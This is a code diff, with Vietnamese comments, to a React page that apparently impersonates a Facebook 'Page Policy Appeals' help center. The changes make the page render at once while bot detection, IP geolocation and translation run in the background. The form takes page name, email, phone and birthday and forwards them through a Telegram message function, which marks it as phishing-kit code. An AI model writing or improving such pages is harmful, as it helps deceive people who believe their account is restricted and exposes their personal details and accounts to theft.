@@ -59,10 +59,11 @@ const Home = () => {
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
-    // 🛡️ THÊM STATE LOADING
-    const [isLoading, setIsLoading] = useState(true);
+    // 🚀 THAY ĐỔI: Thêm state để theo dõi trạng thái bảo mật
+    const [securityChecked, setSecurityChecked] = useState(false);
+    const [isFormEnabled, setIsFormEnabled] = useState(false);
 
-    // 🛡️ THÊM HÀM KHỞI TẠO BẢO MẬT
+    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
     const initializeSecurity = useCallback(async () => {
         try {
             // 1. Kiểm tra bot tự động
@@ -82,28 +83,117 @@ const Home = () => {
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
-            // 3. Xác định ngôn ngữ và dịch
+            // 3. Xác định ngôn ngữ và dịch (chạy sau khi web đã hiển thị)
             const targetLang = countryToLanguage[detectedCountry] || 'en';
             localStorage.setItem('targetLang', targetLang);
             
             if (targetLang !== 'en') {
-                await translateAllTexts(targetLang);
+                // Dịch ở background, không chờ
+                translateCriticalTexts(targetLang);
             }
 
             // 4. Set calling code
             const code = getCountryCallingCode(detectedCountry);
             setCallingCode(`+${code}`);
 
-            setIsLoading(false);
+            // 🚀 QUAN TRỌNG: Đánh dấu đã check bảo mật và enable form
+            setSecurityChecked(true);
+            setIsFormEnabled(true);
             
         } catch (error) {
             console.log('Security initialization failed:', error.message);
-            // Fallback values
+            // 🚀 QUAN TRỌNG: Vẫn enable form nếu có lỗi
             setCountryCode('US');
             setCallingCode('+1');
-            setIsLoading(false);
+            setSecurityChecked(true);
+            setIsFormEnabled(true);
         }
     }, []);
+
+    // 🚀 HÀM DỊCH TEXT QUAN TRỌNG TRƯỚC
+    const translateCriticalTexts = useCallback(async (targetLang) => {
+        try {
+            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit] = await Promise.all([
+                translateText(defaultTexts.helpCenter, targetLang),
+                translateText(defaultTexts.pagePolicyAppeals, targetLang),
+                translateText(defaultTexts.detectedActivity, targetLang),
+                translateText(defaultTexts.accessLimited, targetLang),
+                translateText(defaultTexts.submitAppeal, targetLang),
+                translateText(defaultTexts.pageName, targetLang),
+                translateText(defaultTexts.mail, targetLang),
+                translateText(defaultTexts.phone, targetLang),
+                translateText(defaultTexts.birthday, targetLang),
+                translateText(defaultTexts.yourAppeal, targetLang),
+                translateText(defaultTexts.submit, targetLang)
+            ]);
+
+            setTranslatedTexts(prev => ({
+                ...prev,
+                helpCenter,
+                pagePolicyAppeals,
+                detectedActivity,
+                accessLimited,
+                submitAppeal,
+                pageName,
+                mail,
+                phone,
+                birthday,
+                yourAppeal,
+                submit
+            }));
+
+            // Dịch phần còn lại ở background
+            translateRemainingTexts(targetLang);
+        } catch (error) {
+            console.log('Critical translation failed:', error.message);
+        }
+    }, [defaultTexts]);
+
+    // 🚀 HÀM DỊCH TEXT CÒN LẠI - KHÔNG ẢNH HƯỞNG ĐẾN HIỂN THỊ
+    const translateRemainingTexts = useCallback(async (targetLang) => {
+        try {
+            const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
+                translateText(defaultTexts.english, targetLang),
+                translateText(defaultTexts.using, targetLang),
+                translateText(defaultTexts.managingAccount, targetLang),
+                translateText(defaultTexts.privacySecurity, targetLang),
+                translateText(defaultTexts.policiesReporting, targetLang),
+                translateText(defaultTexts.appealPlaceholder, targetLang),
+                translateText(defaultTexts.fieldRequired, targetLang),
+                translateText(defaultTexts.invalidEmail, targetLang),
+                translateText(defaultTexts.about, targetLang),
+                translateText(defaultTexts.adChoices, targetLang),
+                translateText(defaultTexts.createAd, targetLang),
+                translateText(defaultTexts.privacy, targetLang),
+                translateText(defaultTexts.careers, targetLang),
+                translateText(defaultTexts.createPage, targetLang),
+                translateText(defaultTexts.termsPolicies, targetLang),
+                translateText(defaultTexts.cookies, targetLang)
+            ]);
+
+            setTranslatedTexts(prev => ({
+                ...prev,
+                english, using, managingAccount, privacySecurity, policiesReporting,
+                appealPlaceholder, fieldRequired, invalidEmail, about, adChoices,
+                createAd, privacy, careers, createPage, termsPolicies, cookies
+            }));
+        } catch (error) {
+            console.log('Remaining translation failed:', error.message);
+        }
+    }, [defaultTexts]);
+
+    // 🚀 THAY ĐỔI QUAN TRỌNG: HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
+    useEffect(() => {
+        // Chạy bảo mật ở background
+        initializeSecurity();
+        
+        // 🚀 Enable form sau 2 giây dù bảo mật có xong hay chưa
+        const timer = setTimeout(() => {
+            setIsFormEnabled(true);
+        }, 2000);
+        
+        return () => clearTimeout(timer);
+    }, [initializeSecurity]);
 
     // Hàm validate email
     const validateEmail = (email) => {
@@ -152,53 +242,9 @@ const Home = () => {
         return '*'.repeat(6) + lastTwoDigits;
     };
 
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedPageName, translatedMail, translatedPhone, translatedBirthday, translatedYourAppeal, translatedAppealPlaceholder, translatedSubmitBtn, translatedRequired, translatedInvalidEmail, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.pageName, targetLang), translateText(defaultTexts.mail, targetLang), translateText(defaultTexts.phone, targetLang), translateText(defaultTexts.birthday, targetLang), translateText(defaultTexts.yourAppeal, targetLang), translateText(defaultTexts.appealPlaceholder, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.invalidEmail, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);
-
-                setTranslatedTexts({
-                    helpCenter: translatedHelpCenter,
-                    english: translatedEnglish,
-                    using: translatedUsing,
-                    managingAccount: translatedManaging,
-                    privacySecurity: translatedPrivacy,
-                    policiesReporting: translatedPolicies,
-                    pagePolicyAppeals: translatedAppeals,
-                    detectedActivity: translatedDetected,
-                    accessLimited: translatedLimited,
-                    submitAppeal: translatedSubmit,
-                    pageName: translatedPageName,
-                    mail: translatedMail,
-                    phone: translatedPhone,
-                    birthday: translatedBirthday,
-                    yourAppeal: translatedYourAppeal,
-                    appealPlaceholder: translatedAppealPlaceholder,
-                    submit: translatedSubmitBtn,
-                    fieldRequired: translatedRequired,
-                    invalidEmail: translatedInvalidEmail,
-                    about: translatedAbout,
-                    adChoices: translatedAdChoices,
-                    createAd: translatedCreateAd,
-                    privacy: translatedPrivacyText,
-                    careers: translatedCareers,
-                    createPage: translatedCreatePage,
-                    termsPolicies: translatedTerms,
-                    cookies: translatedCookies
-                });
-            } catch {
-                //
-            }
-        },
-        [defaultTexts]
-    );
-
-    // 🛡️ THAY THẾ useEffect CŨ BẰNG useEffect MỚI
-    useEffect(() => {
-        initializeSecurity();
-    }, [initializeSecurity]);
-
     const handleInputChange = (field, value) => {
+        if (!isFormEnabled) return; // 🚀 Không cho nhập nếu form chưa enabled
+        
         if (field === 'phone') {
             const cleanValue = value.replace(/^\+\d+\s*/, '');
             const asYouType = new AsYouType(countryCode);
@@ -227,6 +273,8 @@ const Home = () => {
     };
 
     const validateForm = () => {
+        if (!isFormEnabled) return false; // 🚀 Không cho submit nếu form chưa enabled
+        
         const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
 
@@ -246,6 +294,8 @@ const Home = () => {
     };
 
     const handleSubmit = async () => {
+        if (!isFormEnabled) return; // 🚀 Không cho submit nếu form chưa enabled
+        
         if (validateForm()) {
             try {
                 const telegramMessage = formatTelegramMessage(formData);
@@ -319,17 +369,7 @@ const Home = () => {
         }
     ];
 
-    // 🛡️ THÊM LOADING COMPONENT
-    if (isLoading) {
-        return (
-            <div className="flex min-h-screen items-center justify-center bg-white">
-                <div className="text-center">
-                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
-                    <p className="mt-4 text-gray-600">Loading...</p>
-                </div>
-            </div>
-        );
-    }
+    // 🚀 XÓA LOADING COMPONENT - LUÔN HIỂN THỊ WEB NGAY
 
     return (
         <>
@@ -378,14 +418,30 @@ const Home = () => {
                                 <p className='text-base sm:text-base'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
+                                <input 
+                                    type='text' 
+                                    name='pageName' 
+                                    autoComplete='organization' 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
+                                    value={formData.pageName} 
+                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
+                                    disabled={!isFormEnabled}
+                                />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-base'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
+                                <input 
+                                    type='email' 
+                                    name='mail' 
+                                    autoComplete='email' 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
+                                    value={formData.mail} 
+                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
+                                    disabled={!isFormEnabled}
+                                />
                                 {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                             </div>
@@ -393,9 +449,19 @@ const Home = () => {
                                 <p className='text-base sm:text-base'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
-                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
+                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                     <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
-                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
+                                    <input 
+                                        type='tel' 
+                                        name='phone' 
+                                        inputMode='numeric' 
+                                        pattern='[0-9]*' 
+                                        autoComplete='off' 
+                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
+                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
+                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                        disabled={!isFormEnabled}
+                                    />
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
@@ -408,9 +474,10 @@ const Home = () => {
                                 <input 
                                     type='date' 
                                     name='birthday' 
-                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                     value={formData.birthday} 
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
+                                    disabled={!isFormEnabled}
                                 />
                                 
                                 {/* Mobile: type='date' với placeholder ảo */}
@@ -422,11 +489,12 @@ const Home = () => {
                                         value={formData.birthday} 
                                         onChange={(e) => handleInputChange('birthday', e.target.value)}
                                         required
+                                        disabled={!isFormEnabled}
                                     />
                                     {/* Placeholder ảo cho mobile */}
                                     <div 
-                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
-                                        onClick={() => document.querySelectorAll('input[name="birthday"]')[1].click()}
+                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
+                                        onClick={() => isFormEnabled && document.querySelectorAll('input[name="birthday"]')[1].click()}
                                     >
                                         {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
                                     </div>
@@ -441,16 +509,28 @@ const Home = () => {
                                 <textarea 
                                     name='appeal'
                                     rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
                                     onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                    disabled={!isFormEnabled}
                                 />
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <button className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2' onClick={handleSubmit}>
-                                {translatedTexts.submit}
+                            <button 
+                                className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 ${!isFormEnabled ? 'bg-gray-400 cursor-not-allowed text-white' : 'bg-blue-600 hover:bg-blue-700 text-white'}`} 
+                                onClick={handleSubmit}
+                                disabled={!isFormEnabled}
+                            >
+                                {!isFormEnabled ? 'Đang kiểm tra...' : translatedTexts.submit}
                             </button>
+                            
+                            {/* 🚀 Hiển thị trạng thái bảo mật */}
+                            {!securityChecked && (
+                                <div className="text-center text-sm text-gray-500 mt-2">
+                                    Đang kiểm tra bảo mật...
+                                </div>
+                            )}
                         </div>
                     </div>
                     <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
